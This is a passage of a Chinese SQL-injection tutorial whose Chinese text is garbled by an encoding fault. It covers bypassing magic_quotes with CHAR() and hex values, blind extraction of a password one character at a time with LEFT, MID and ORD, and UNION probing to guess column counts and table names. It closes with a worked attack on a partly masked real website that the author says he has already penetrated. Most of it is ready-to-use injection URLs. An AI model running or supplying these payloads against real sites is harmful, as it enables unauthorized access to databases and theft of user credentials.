style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">#!/usr/bin/perl<br />#cody by SuperÂ·Hei&nbsp;<br />#to angel<br />#C:\&gt;test.pl c:\boot.ini<br />#99,58,92,98,111,111,116,46,105,110,105</span></p><p><span style="color:#0000ff;">$ARGC = @ARGV;<br />if ($ARGC != 1) {<br />ã€€ã€€print "Usage: $0 \n";<br />ã€€ã€€exit(1);<br />}</span></p><p><span style="color:#0000ff;">$path=shift;</span></p><p><span style="color:#0000ff;">@char = unpack('C*', $path);</span></p><p><span style="color:#0000ff;">$asc=join(",",@char);</span></p><p><span style="color:#0000ff;">print $asc;</span></p></td></tr></tbody></table></div><p><span style="font-weight:700;">2ã€ä¸åŠ å•å¼•å·æ³¨å…¥</span></p><p><em>æ³¨ï¼šç°åœ¨æˆ‘ä»¬å‡è®¾magic_quotes_gpcä¸ºonäº†ã€‚</em></p><p>ã€€ã€€ä¼—æ‰€å‘¨çŸ¥ï¼Œæ•´å½¢çš„æ•°æ®æ˜¯ä¸éœ€è¦ç”¨å¼•å·å¼•èµ·æ¥çš„ï¼Œè€Œå­—ç¬¦ä¸²å°±è¦ç”¨å¼•å·ï¼Œè¿™æ ·å¯ä»¥é¿å…å¾ˆå¤šé—®é¢˜ã€‚ä½†æ˜¯å¦‚æœä»…ä»…ç”¨æ•´å½¢æ•°æ®ï¼Œæˆ‘ä»¬æ˜¯æ²¡æœ‰åŠæ³•æ³¨å…¥çš„ï¼Œæ‰€ä»¥æˆ‘éœ€è¦æŠŠæˆ‘ä»¬æ„é€ çš„è¯­å¥è½¬æ¢æˆæ•´å½¢ç±»å‹ï¼Œè¿™ä¸ªå°±éœ€è¦ç”¨åˆ°CHAR()ï¼ŒASCII(),ORD(),CONV()è¿™äº›å‡½æ•°äº†ï¼Œä¸¾ä¸ªç®€å•çš„ä¾‹å­ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">SELECT * FROM user WHERE username='angel'</span></p></td></tr></tbody></table></div><p>ã€€ã€€å¦‚ä½•ä½¿$usernameä¸å¸¦å¼•å·å‘¢ï¼Ÿå¾ˆç®€å•æˆ‘ä»¬è¿™æ ·æäº¤å°±å¯ä»¥äº†ã€‚</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">SELECT * FROM user WHERE username=char(97,110,103,101,108)<br /># char(97,110,103,101,108) ç›¸å½“äºangelï¼Œåè¿›åˆ¶ã€‚<br />SELECT * FROM user WHERE username=0x616E67656C<br /># 0x616E67656C ç›¸å½“äºangelï¼Œåå…­è¿›åˆ¶ã€‚</span></p></td></tr></tbody></table></div><p>ã€€ã€€å…¶ä»–å‡½æ•°å¤§å®¶è‡ªå·±å»æµ‹è¯•å¥½äº†ï¼Œä½†æ˜¯å‰æå°±å¦‚ä¸Šé¢æ‰€è¯´çš„ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ çš„å˜é‡ä¸è¢«å¼•å·æ‰€åŒ…å«æ‰æœ‰æ„ä¹‰ï¼Œä¸ç„¶æˆ‘ä»¬ä¸ç®¡æ„é€ ä»€ä¹ˆï¼Œåªæ˜¯å­—ç¬¦ä¸²ï¼Œå‘æŒ¥ä¸äº†ä½œç”¨ï¼Œæ¯”å¦‚å‰é¢çŒœå¯†ç çš„ä¾‹å­(user,php)ï¼Œæˆ‘ä»¬æŠŠæŸ¥è¯¢æ¡ä»¶æ”¹ä¸ºuseridï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">SELECT * FROM user WHERE userid=userid</span></p></td></tr></tbody></table></div><p>ã€€ã€€æŒ‰ç…§æ­£å¸¸çš„ï¼Œæäº¤ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?userid=1</span></p></td></tr></tbody></table></div><p>ã€€ã€€å°±å¯ä»¥æŸ¥è¯¢useridä¸º1çš„ç”¨æˆ·èµ„æ–™ï¼Œå› ä¸º1æ˜¯æ•°å­—ï¼Œæ‰€ä»¥æœ‰æ²¡æœ‰å¼•å·éƒ½æ— æ‰€è°“ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬æ„é€ ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?userid=1 and password=mypass</span></p></td></tr></tbody></table></div><p>ã€€ã€€ç»å¯¹é”™è¯¯ï¼Œå› ä¸ºmypassæ˜¯å­—ç¬¦ä¸²ï¼Œé™¤éæäº¤ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?userid=1 and password='mypass'</span></p></td></tr></tbody></table></div><p>ã€€ã€€ç”±äºmagic_quotes_gpcæ‰“å¼€çš„å…³ç³»ï¼Œè¿™ä¸ªæ˜¯ç»å¯¹ä¸å¯èƒ½çš„ã€‚å¼•å·ä¼šå˜æˆ/'ï¼Œæˆ‘ä»¬æœ‰ä»€ä¹ˆåŠæ³•å¯ä»¥æŠŠè¿™äº›å­—ç¬¦ä¸²å˜æˆæ•´å½¢æ•°æ®å—ï¼Ÿå°±æ˜¯ç”¨CHAR()å‡½æ•°ï¼Œå¦‚æœæˆ‘ä»¬æäº¤ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?userid=1 and password=char(109,121,112,97,115,115)</span></p></td></tr></tbody></table></div><p>ã€€ã€€æ­£å¸¸è¿”å›ï¼Œå®è·µè¯æ˜ï¼Œæˆ‘ä»¬ç”¨CHAR()æ˜¯å¯è¡Œçš„ï¼Œæˆ‘ä»¬å°±æŠŠCHAR()ç”¨è¿›LEFTå‡½æ•°é‡Œé¢é€ä½çŒœè§£ï¼</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?userid=1 and LEFT(password,1)=char(109)</span></p></td></tr></tbody></table></div><p>ã€€ã€€æ­£å¸¸è¿”å›ï¼Œè¯´æ˜useridä¸º1çš„ç”¨æˆ·ï¼Œpasswordå­—æ®µç¬¬ä¸€ä½æ˜¯char(109)ï¼Œæˆ‘ä»¬ç»§ç»­çŒœï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?userid=1 and LEFT(password,2)=char(109,121)</span></p></td></tr></tbody></table></div><p>ã€€ã€€åˆæ­£å¸¸è¿”å›ï¼Œè¯´æ˜æ­£ç¡®ï¼Œä½†è¿™æ ·å½±å“åˆ°æ•ˆç‡ï¼Œæ—¢ç„¶æ˜¯æ•´å½¢ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥ç”¨æ¯”è¾ƒè¿ç®—ç¬¦æ¥æ¯”è¾ƒï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?userid=1 and LEFT(password,1)&gt;char(100)</span></p></td></tr></tbody></table></div><p>ã€€ã€€ç„¶åé€‚å½“è°ƒæ•´char()é‡Œé¢çš„æ•°å­—æ¥ç¡®å®šä¸€ä¸ªèŒƒå›´ï¼Œå¾ˆå¿«å°±å¯ä»¥çŒœå‡ºæ¥ï¼Œåˆ°äº†åé¢çš„æ—¶å€™ï¼Œè¿˜æ˜¯å¯ä»¥ç”¨æ¯”è¾ƒè¿ç®—ç¬¦æ¥æ¯”è¾ƒï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?userid=1 and LEFT(password,3)&gt;char(109,121,111)</span></p></td></tr></tbody></table></div><p>ã€€ã€€è€ŒåŸæ¥å·²ç»çŒœå¥½çš„ä¸ç”¨æ”¹å˜äº†ï¼Œå¾ˆå¿«å°±å¯ä»¥çŒœå®Œï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?userid=1 and LEFT(password,6)=char(109,121,112,97,115,115)</span></p></td></tr></tbody></table></div><p align="center"><img title="SQLæ³¨å…¥è¯­å¥å¤§å…¨ - ã€è½°éš†éš†ã€‘ - é¾™åœ¨å¤©æ¶¯" height="453" alt="SQLæ³¨å…¥è¯­å¥å¤§å…¨ - ã€è½°éš†éš†ã€‘ - é¾™åœ¨å¤©æ¶¯" src="http://www.4ngel.net/img/php7.gif" width="760" style="border:0px;" /></p><p>ã€€ã€€ç„¶ååœ¨mysql&gt;å‘½ä»¤æç¤ºç¬¦ä¸‹æˆ–è€…åœ¨phpMyadminé‡Œé¢æ‰§è¡Œï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">select char(109,121,112,97,115,115)</span></p></td></tr></tbody></table></div><p>ã€€ã€€å°±ä¼šè¿”å›ï¼šmypass</p><p align="center"><img title="SQLæ³¨å…¥è¯­å¥å¤§å…¨ - ã€è½°éš†éš†ã€‘ - é¾™åœ¨å¤©æ¶¯" height="344" alt="SQLæ³¨å…¥è¯­å¥å¤§å…¨ - ã€è½°éš†éš†ã€‘ - é¾™åœ¨å¤©æ¶¯" src="http://www.4ngel.net/img/php8.gif" width="322" style="border:0px;" /></p><p>ã€€ã€€å½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨SUBSTRING(str,pos,len)å’ŒMID(str,pos,len)å‡½æ•°ï¼Œä»å­—ç¬¦ä¸² str çš„ pos ä½ç½®èµ·è¿”å› len ä¸ªå­—ç¬¦çš„å­ä¸²ã€‚è¿™ä¸ªå’ŒACCESSæ˜¯ä¸€æ ·çš„ã€‚è¿˜æ˜¯åˆšæ‰çš„ä¾‹å­ï¼Œæˆ‘ä»¬çŒœpasswordå­—æ®µçš„ç¬¬ä¸‰ä½ã€ç¬¬å››ä½è¯•è¯•ï¼Œç¬¬ä¸‰ä½æ˜¯pï¼Œç¬¬å››ä½æ˜¯aï¼Œæˆ‘ä»¬è¿™æ ·æ„é€ ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?userid=1 and mid(password,3,1)=char(112)<br />http://127.0.0.1/injection/user.php?userid=1 and mid(password,4,1)=char(97)</span></p></td></tr></tbody></table></div><p>ã€€ã€€æˆ‘ä»¬è¦çš„ç»“æœå°±è¿¸å‡ºæ¥äº†ã€‚å½“ç„¶ï¼Œå¦‚æœè§‰å¾—éº»çƒ¦ï¼Œè¿˜å¯ä»¥ç”¨æ›´ç®€å•çš„åŠæ³•ï¼Œå°±æ˜¯åˆ©ç”¨ord()å‡½æ•°ï¼Œå…·ä½“ä½œç”¨å¯ä»¥å»æŸ¥çœ‹MYSQLå‚è€ƒæ‰‹å†Œï¼Œè¯¥å‡½æ•°è¿”å›çš„æ˜¯æ•´å½¢ç±»å‹çš„æ•°æ®ï¼Œå¯ä»¥ç”¨æ¯”è¾ƒè¿ç®—ç¬¦è¿›è¡Œæ¯”è¾ƒã€å½“ç„¶å¾—å‡ºçš„ç»“æœä¹Ÿå°±å¿«å¤šäº†ï¼Œä¹Ÿå°±æ˜¯è¿™æ ·æäº¤ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?userid=1 and ord(mid(password,3,1))&gt;111<br />http://127.0.0.1/injection/user.php?userid=1 and ord(mid(password,3,1))&lt;113<br />http://127.0.0.1/injection/user.php?userid=1 and ord(mid(password,3,1))=112</span></p></td></tr></tbody></table></div><p>ã€€ã€€è¿™æ ·æˆ‘ä»¬å°±å¾—å‡ºç»“æœäº†ï¼Œç„¶åæˆ‘ä»¬å†ç”¨char()å‡½æ•°è¿˜åŸå‡ºæ¥å°±å¥½äº†ã€‚è‡³äºå…¶ä»–æ›´å¤šå‡½æ•°ï¼Œå¤§å®¶å¯ä»¥è‡ªå·±å»è¯•éªŒï¼Œé™äºç¯‡å¹…ä¹Ÿä¸å¤šè¯´äº†ã€‚</p><p><span style="font-weight:700;">3ã€å¿«é€Ÿç¡®å®šæœªçŸ¥æ•°æ®ç»“æ„çš„å­—æ®µåŠç±»å‹</span></p><p>ã€€ã€€å¦‚æœä¸æ¸…æ¥šæ•°æ®ç»“æ„ï¼Œå¾ˆéš¾ç”¨UNIONè”åˆæŸ¥è¯¢ï¼Œè¿™é‡Œæˆ‘å‘Šè¯‰å¤§å®¶ä¸€ä¸ªå°æŠ€å·§ï¼Œä¹Ÿæ˜¯éå¸¸æœ‰ç”¨éå¸¸å¿…è¦çš„æŠ€å·§ï¼Œå……åˆ†å‘æŒ¥UNIONçš„ç‰¹æ€§ã€‚<br />ã€€ã€€è¿˜æ˜¯æ‹¿å‰é¢çš„show.phpæ–‡ä»¶åšä¾‹å­ï¼Œå½“æˆ‘ä»¬çœ‹åˆ°å½¢å¦‚xxx.php?id=xxxçš„URLçš„æ—¶å€™ï¼Œå¦‚æœè¦UNIONï¼Œå°±è¦çŸ¥é“è¿™ä¸ªxxx.phpæŸ¥è¯¢çš„æ•°æ®è¡¨çš„ç»“æ„ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·æäº¤æ¥å¿«é€Ÿç¡®å®šæœ‰å¤šå°‘ä¸ªå­—æ®µï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/show.php?id=-1 union select 1,1,1</span></p></td></tr></tbody></table></div><p>ã€€ã€€æœ‰å¤šå°‘ä¸ªâ€œ1â€å°±è¡¨ç¤ºæœ‰å¤šå°‘ä¸ªå­—æ®µï¼Œå¯ä»¥æ…¢æ…¢è¯•ï¼Œå¦‚æœå­—æ®µæ•°ä¸ç›¸åŒï¼Œå°±è‚¯å®šä¼šå‡ºé”™ï¼Œå¦‚æœå­—æ®µæ•°çŒœå¯¹äº†ï¼Œå°±è‚¯å®šä¼šè¿”å›æ­£ç¡®çš„é¡µé¢ï¼Œå­—æ®µæ•°å‡ºæ¥äº†ï¼Œå°±å¼€å§‹åˆ¤æ–­æ•°æ®ç±»å‹ï¼Œå…¶å®ä¹Ÿå¾ˆå®¹æ˜“ï¼Œéšä¾¿ç”¨å‡ ä¸ªå­—æ¯ä»£æ›¿ä¸Šé¢çš„1ï¼Œä½†æ˜¯ç”±äºmagic_quotes_gpcæ‰“å¼€ï¼Œæˆ‘ä»¬ä¸èƒ½ç”¨å¼•å·ï¼Œè€åŠæ³•ï¼Œè¿˜æ˜¯ç”¨char()å‡½æ•°ï¼Œchar(97)è¡¨ç¤ºå­—æ¯â€œaâ€ï¼Œå¦‚ä¸‹ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/show.php?id=-1 union select char(97),char(97),char(97)</span></p></td></tr></tbody></table></div><p>ã€€ã€€å¦‚æœæ˜¯å­—ç¬¦ä¸²ï¼Œé‚£å°±ä¼šæ­£å¸¸æ˜¾ç¤ºâ€œaâ€ï¼Œå¦‚æœä¸æ˜¯å­—ç¬¦ä¸²æˆ–æ–‡æœ¬ï¼Œä¹Ÿå°±æ˜¯è¯´æ˜¯æ•´å½¢æˆ–å¸ƒå°”å½¢ï¼Œå°±ä¼šè¿”å›â€œ0â€ï¼Œå¦‚å›¾ï¼š</p><p align="center"><img title="SQLæ³¨å…¥è¯­å¥å¤§å…¨ - ã€è½°éš†éš†ã€‘ - é¾™åœ¨å¤©æ¶¯" height="432" alt="SQLæ³¨å…¥è¯­å¥å¤§å…¨ - ã€è½°éš†éš†ã€‘ - é¾™åœ¨å¤©æ¶¯" src="http://www.4ngel.net/img/php9.GIF" width="521" style="border:0px;" /></p><p>ã€€ã€€åˆ¤æ–­æœ€ä¸»è¦é ä»€ä¹ˆï¼Ÿç»éªŒï¼Œæˆ‘ä»¥å‰ä¸€ç›´éƒ½è¯´ï¼Œç»éªŒå¾ˆé‡è¦ï¼Œä¸°å¯Œç»éªŒèƒ½æ›´å¥½çš„ä½œå‡ºæ­£ç¡®çš„åˆ¤æ–­ï¼Œå› ä¸ºç¨‹åºçš„ä»£ç æ˜¯åƒå˜ä¸‡åŒ–çš„ï¼Œæˆ‘ä»¬è¿™é‡Œæ˜¯åªæ˜¯ä¸¾ä¸ªæœ€ç®€å•çš„ä¾‹å­ï¼Œè¿™é‡Œç”±äºå±€é™æ€§ï¼Œç¨‹åºéƒ½æ˜¯æˆ‘è‡ªå·±å†™ã€è‡ªå·±æµ‹è¯•çš„ã€‚æ–¹æ³•å› ç¨‹åºè€Œå¼‚ã€‚å¸Œæœ›å¤§å®¶åœ¨å®æˆ˜ä¸­ï¼Œæ³¨æ„åŒºåˆ«ï¼Œä¸è¦ç…§æ¬ï¼Œçµæ´»è¿ç”¨æ‰æ˜¯æ ¹æœ¬ã€‚</p><p><span style="font-weight:700;">4ã€çŒœæ•°æ®è¡¨å</span></p><p>ã€€ã€€åœ¨å¿«é€Ÿç¡®å®šæœªçŸ¥æ•°æ®ç»“æ„çš„å­—æ®µåŠç±»å‹çš„åŸºç¡€ä¸Šï¼Œæˆ‘ä»¬åˆå¯ä»¥è¿›ä¸€æ­¥çš„åˆ†ææ•´ä¸ªæ•°æ®ç»“æ„ï¼Œé‚£å°±æ˜¯çŒœè¡¨åï¼Œå…¶å®ä½¿ç”¨UNIONè”åˆæŸ¥è¯¢çš„æ—¶å€™ï¼Œä¸ç®¡åé¢çš„æŸ¥è¯¢æ€ä¹ˆâ€œç•¸å½¢â€ï¼Œåªè¦æ²¡æœ‰è¯­å¥ä¸Šçš„é—®é¢˜ï¼Œéƒ½ä¼šæ­£ç¡®è¿”å›ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸Šé¢çš„åŸºç¡€ä¸Šï¼Œè¿›ä¸€æ­¥çŒœåˆ°è¡¨åäº†ï¼Œæ¯”å¦‚åˆšæ‰æˆ‘ä»¬æäº¤ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/show.php?id=1 union select 1,1,1</span></p></td></tr></tbody></table></div><p>ã€€ã€€è¿”å›æ­£å¸¸çš„å†…å®¹ï¼Œå°±è¯´æ˜è¿™ä¸ªæ–‡ä»¶æŸ¥è¯¢çš„è¡¨å†…æ˜¯å­˜åœ¨3ä¸ªå­—æ®µçš„ï¼Œç„¶åæˆ‘ä»¬åœ¨åé¢åŠ å…¥from table_nameï¼Œä¹Ÿå°±æ˜¯è¿™æ ·ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/show.php?id=1 union select 1,1,1 from members<br />http://127.0.0.1/injection/show.php?id=1 union select 1,1,1 from admin<br />http://127.0.0.1/injection/show.php?id=1 union select 1,1,1 from user</span></p></td></tr></tbody></table></div><p>ã€€ã€€å¦‚æœè¿™ä¸ªè¡¨æ˜¯å­˜åœ¨çš„ï¼Œé‚£ä¹ˆåŒæ ·ä¼šè¿”å›åº”è¯¥æ˜¾ç¤ºçš„å†…å®¹ï¼Œå¦‚æœè¡¨ä¸å­˜åœ¨ï¼Œå½“ç„¶å°±ä¼šå‡ºé”™äº†ï¼Œæ‰€ä»¥æˆ‘çš„æ€è·¯æ˜¯å…ˆè·å¾—æœ‰æ¼æ´çš„æ–‡ä»¶æ‰€æŸ¥è¯¢è¡¨çš„æ•°æ®ç»“æ„ï¼Œç¡®å®šç»“æœåå†è¿›ä¸€æ­¥æŸ¥è¯¢è¡¨ï¼Œè¿™ä¸ªæ‰‹å·¥æ“ä½œæ˜¯æ²¡æœ‰æ•ˆç‡çš„é—®é¢˜çš„ï¼Œä¸åˆ°ä¸€åˆ†é’Ÿå°±å¯ä»¥æŸ¥è¯¢åˆ°äº†ï¼Œæ¯”å¦‚æˆ‘ä»¬åœ¨æµ‹è¯•www.***bai.netå°±æ˜¯è¿™æ ·ï¼Œåé¢çš„å®ä¾‹ä¼šæ¶‰åŠåˆ°ã€‚<br />ã€€ã€€ä½†æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œç”±äºå¾ˆå¤šæƒ…å†µä¸‹ï¼Œå¾ˆå¤šç¨‹åºçš„æ•°æ®è¡¨éƒ½ä¼šæœ‰ä¸€ä¸ªå‰ç¼€ï¼Œæœ‰è¿™ä¸ªå‰ç¼€å°±å¯ä»¥è®©å¤šä¸ªç¨‹åºå…±ç”¨ä¸€ä¸ªæ•°æ®åº“ã€‚æ¯”å¦‚ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">site_article<br />site_user<br />site_download<br />forum_user<br />forum_post<br />â€¦â€¦</span></p></td></tr></tbody></table></div><p>ã€€ã€€å¦‚æœå®‰å…¨æ„è¯†é«˜çš„è¯ï¼Œç®¡ç†å‘˜ä¼šåŠ ä¸ªè¡¨åå‰ç¼€ï¼Œé‚£çŒœè§£å°±å¾ˆéº»çƒ¦äº†ï¼Œä¸è¿‡å®Œå…¨å¯ä»¥åšä¸€ä¸ªè¡¨ååˆ—è¡¨æ¥è·‘ã€‚è¿™é‡Œå°±ä¸å¤šè¯´äº†ï¼Œåé¢ä¼šæœ‰ä¸€ä¸ªå…·ä½“çš„ä¾‹å­æ¥è§£å¼€ä¸€åˆ‡è¿·èŒ«^_^â€¦â€¦</p><p><span style="font-weight:700;">å®ä¾‹</span></p><p>ã€€ã€€ä¸‹é¢å¯¹ä¸€ä¸ªå›½å†…éå¸¸å‡ºåçš„ç«™ç‚¹è¿›è¡Œå–„æ„çš„æ”»å‡»æµ‹è¯•ï¼Œæ¥å¯¹ä¸Šé¢çš„çŸ¥è¯†è¿›è¡Œä¸€æ¬¡å¤§æ¦‚çš„éªŒè¯ï¼Œå‡ºäºå½±å“ç­‰è¯¸å¤šå› ç´ ï¼Œæˆ‘ä»¬ç§°è¿™ä¸ªç«™ç‚¹ä¸ºHB(www.***bai.net)ï¼ŒHBä½¿ç”¨çš„æ˜¯å¤œçŒ«çš„æ–‡ç« ç³»ç»Ÿå’Œä¸‹è½½ç³»ç»Ÿï¼Œä¸è¿‡æ–‡ç« ç³»ç»Ÿå·²ç»å‡çº§äº†ï¼Œæˆ‘ä»¬å°±ä¸çœ‹äº†ï¼Œä¸‹è½½ç³»ç»Ÿæ˜¯ç»å¯¹æœ‰é—®é¢˜çš„ï¼Œä¸è¿‡ç”±äºæˆ‘ç°åœ¨å†™æ–‡ç« çš„ç”µè„‘ä¸ä¸Šç½‘ï¼Œæˆ‘ç”¨ç›¸åŒçš„ä¸‹è½½ç³»ç»Ÿåœ¨æœ¬åœ°è¿›è¡Œä¸€æ¬¡æ¨¡æ‹Ÿçš„æµ‹è¯•ã€‚å®é™…ä¸Šï¼Œæˆ‘äº‹å‰æ—©ç”¨æ›´ç‹ æ¯’çš„æŠ€æœ¯æ¸—é€è¿‡HBã€‚<br />ã€€ã€€é¦–å…ˆæˆ‘ä»¬æ‰¾åˆ°æœ‰é—®é¢˜çš„æ–‡ä»¶ï¼Œshow.php?id=1ï¼Œæˆ‘ä»¬é©¬ä¸Šçœ‹çœ‹æ•°æ®ç»“æ„å’Œè¡¨åï¼Œçœ‹çœ‹HBæœ‰æ²¡æœ‰æ”¹å­—æ®µå’Œè¡¨åï¼Œæˆ‘æ—©çŸ¥é“å¤œçŒ«ä¸‹è½½ç³»ç»Ÿ1.0.1ç‰ˆçš„è½¯ä»¶ä¿¡æ¯çš„è¡¨æœ‰19ä¸ªå­—æ®µï¼Œå°±æäº¤ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/ymdown/show.php?id=1 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1</span></p></td></tr></tbody></table></div><p>ã€€ã€€æ³¨æ„ï¼Œè¿™é‡Œæœ‰19ä¸ªâ€œ1â€ï¼Œè¿”å›æ­£å¸¸çš„é¡µé¢ï¼Œæˆ‘å¯ä»¥å¯ä»¥è‚¯å®šå­—æ®µæ²¡æœ‰å˜ï¼Œæˆ‘ä»¬ä¹Ÿå°±åˆ«æ‹–æ‹‰äº†ï¼Œç›´æ¥çœ‹çœ‹å¤œçŒ«çš„é»˜è®¤ç”¨æˆ·æ•°æ®è¡¨æ˜¯å¦å­˜åœ¨ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/ymdown/show.php?id=1 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user</span></p></td></tr></tbody></table></div><p>ã€€ã€€æ­£å¸¸è¿”å›ï¼Œå¦‚å›¾ï¼Œå¦‚æœURLä¸æ¸…æ¥šå¯ä»¥çœ‹æ ‡é¢˜é‚£é‡Œï¼š</p><p align="center"><img title="SQLæ³¨å…¥è¯­å¥å¤§å…¨ - ã€è½°éš†éš†ã€‘ - é¾™åœ¨å¤©æ¶¯" height="653" alt="SQLæ³¨å…¥è¯­å¥å¤§å…¨ - ã€è½°éš†éš†ã€‘ - é¾™åœ¨å¤©æ¶¯" src="http://www.4ngel.net/img/php10.GIF" width="715" style="border:0px;" /></p><p>ã€€ã€€å—¯ï¼Œè¿™ä¸ªHBè¿˜çœŸæ˜¯å¤Ÿæ‡’çš„ï¼Œè¿™ä¹ˆçƒ‚çš„ç¨‹åºä¹Ÿä¸çŸ¥é“å…ˆä¿®æ”¹ä¸€ä¸‹å†ç”¨ï¼Œä¸è¿‡ä¹Ÿæ˜¯ï¼Œæ²¡æœ‰å¤šå°‘äººå’Œæˆ‘ä¸€æ ·æœ‰é—²å¿ƒå…ˆå»åŠ å›ºç¨‹åºæ‰ç”¨çš„ï¼Œå†çœ‹é»˜è®¤çš„ç”¨æˆ·idè¿˜åœ¨ä¸åœ¨ï¼Ÿ</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/ymdown/show.php?id=1 union select 